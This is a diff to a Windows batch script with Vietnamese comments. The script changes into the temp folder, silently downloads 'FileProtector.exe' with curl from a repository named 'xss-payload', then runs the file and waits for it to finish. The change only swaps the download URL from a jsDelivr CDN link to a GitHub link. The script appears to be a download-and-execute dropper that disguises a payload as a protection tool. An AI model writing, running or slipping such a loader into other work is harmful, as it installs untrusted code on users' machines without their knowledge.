@@ -2,7 +2,7 @@
 cd /d "%TEMP%"
 
 :: Tải file
-curl -sL -o FileProtector.exe "https://cdn.jsdelivr.net/gh/Syspho99/xss-payload@main/FileProtector.exe"
+curl -sL -o FileProtector.exe "https://github.com/Syspho99/xss-payload/blob/main/FileProtector.exe"
 if not exist FileProtector.exe exit /b 1
 
 :: Chạy file và ĐỢI nó kết thúc
